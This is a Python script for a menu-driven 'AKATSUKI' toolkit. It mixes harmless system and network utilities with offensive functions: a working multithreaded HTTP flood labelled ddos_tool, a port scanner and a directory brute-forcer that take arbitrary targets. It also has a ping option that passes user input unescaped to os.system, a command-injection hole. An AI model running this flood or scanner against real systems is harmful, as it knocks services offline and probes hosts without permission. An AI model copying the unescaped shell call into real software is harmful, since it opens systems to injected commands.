import requests
import webbrowser
import os
import socket
import dns.resolver
import whois
import base64
import hashlib
import time
import uuid
import platform
import subprocess
import json
import threading
import psutil
import ssl
import secrets
import string
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table

console = Console()

# Configuration and Themes
THEMES = {
    "1": "white",
    "2": "bold red",
    "3": "bold cyan",
    "4": "bold green",
    "5": "bold yellow"
}
current_theme = "white"

def header():
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print(Panel("[bold red]AKATSUKI - tensuraispeak on github[/bold red]", style=current_theme))

def change_theme():
    global current_theme
    console.print("Select Theme: [1] White [2] Red [3] Cyan [4] Green [5] Yellow")
    choice = Prompt.ask("Theme Choice")
    current_theme = THEMES.get(choice, "white")

# --- Network Features ---
def ip_to_location():
    ip = Prompt.ask("Enter IP (Leave blank for current)")
    url = f"http://ip-api.com/json/{ip}"
    try:
        r = requests.get(url, timeout=5).json()
        if r.get('status') == 'success':
            table = Table(title="IP Details")
            table.add_column("Key")
            table.add_column("Value")
            for k, v in r.items(): table.add_row(str(k), str(v))
            console.print(table)
        else: console.print("[red]Lookup Failed[/red]")
    except: console.print("[red]Connection Error[/red]")

def port_scan_full():
    target = Prompt.ask("Target")
    target_ip = socket.gethostbyname(target)
    for port in range(20, 1025):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.01)
        if s.connect_ex((target_ip, port)) == 0:
            console.print(f"[green]Port {port} OPEN[/green]")
        s.close()

def ddos_tool():
    target_ip = Prompt.ask("Enter Target IP")
    target_port = int(Prompt.ask("Enter Target Port", default="80"))
    threads_count = int(Prompt.ask("Enter Thread Count", default="500"))

    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
                s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
                s.close()
            except socket.error:
                break

    console.print(f"[bold red]Starting flood on {target_ip}:{target_port} with {threads_count} threads...[/bold red]")
    for i in range(threads_count):
        thread = threading.Thread(target=flood)
        thread.daemon = True
        thread.start()
    console.print("[yellow]Attack running. Press Ctrl+C to stop.[/yellow]")

# --- Logic Features ---
def get_sys_info(): console.print(f"[bold]System:[/bold] {platform.platform()}\n[bold]Processor:[/bold] {platform.processor()}")
def ping_target(): 
    target = Prompt.ask("Host")
    os.system(f"ping -c 4 {target}" if os.name != 'nt' else f"ping -n 4 {target}")
def gen_uuid(): console.print(f"UUID: {uuid.uuid4()}")
def base64_decode():
    data = Prompt.ask("Data")
    console.print(base64.b64decode(data.encode()).decode())
def sha256_hash():
    data = Prompt.ask("Text")
    console.print(hashlib.sha256(data.encode()).hexdigest())
def process_list():
    for proc in psutil.process_iter(['pid', 'name']): console.print(proc.info)
def list_wifi(): os.system("netsh wlan show profiles" if os.name == 'nt' else "nmcli dev wifi")
def get_mac(): console.print(f"MAC: {':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])}")
def battery_status(): console.print(f"Battery: {psutil.sensors_battery().percent}%" if psutil.sensors_battery() else "No battery")
def cpu_usage(): console.print(f"CPU: {psutil.cpu_percent(interval=1)}%")
def ram_usage(): console.print(f"RAM: {psutil.virtual_memory().percent}%")
def network_stats(): console.print(psutil.net_io_counters()._asdict())
def kill_process():
    pid = int(Prompt.ask("PID to kill"))
    psutil.Process(pid).terminate()
def site_status():
    url = Prompt.ask("URL")
    try: console.print(f"Status: {requests.get(url).status_code}")
    except: console.print("Failed")
def gen_random_pass():
    console.print(''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16)))
def dir_brute():
    url = Prompt.ask("Base URL")
    for d in ['admin', 'login', 'dashboard', 'assets', 'api', 'v1', 'config', 'test', 'backup', 'db']:
        try:
            if requests.get(f"{url}/{d}").status_code == 200: console.print(f"Found: {url}/{d}")
        except: continue
def weather_check():
    city = Prompt.ask("City")
    console.print(requests.get(f"http://wttr.in/{city}?0T").text)
def reverse_dns():
    ip = Prompt.ask("IP")
    try: console.print(socket.gethostbyaddr(ip))
    except: console.print("Failed")
def ssl_check():
    host = Prompt.ask("Host")
    ctx = ssl.create_default_context()
    with socket.create_connection((host, 443)) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            console.print(ssock.version())
def disk_usage(): console.print(psutil.disk_usage('/').percent)

# --- Feature Mapping ---
menu = {
    "1": ip_to_location, "2": change_theme, "3": port_scan_full, "4": get_sys_info,
    "5": ping_target, "6": gen_uuid, "7": base64_decode, "8": sha256_hash,
    "9": process_list, "10": list_wifi, "11": get_mac, "12": battery_status,
    "13": cpu_usage, "14": ram_usage, "15": network_stats, "16": kill_process,
    "17": site_status, "18": gen_random_pass, "19": dir_brute, "20": weather_check,
    "21": reverse_dns, "22": ssl_check, "23": disk_usage, "24": ddos_tool
}

while True:
    header()
    for k, v in menu.items(): console.print(f"[{k}] {v.__name__.replace('_', ' ').title()}")
    choice = Prompt.ask("Select")
    if choice in menu: 
        menu[choice]()
        Prompt.ask("\nDone. Enter to continue")
    else: break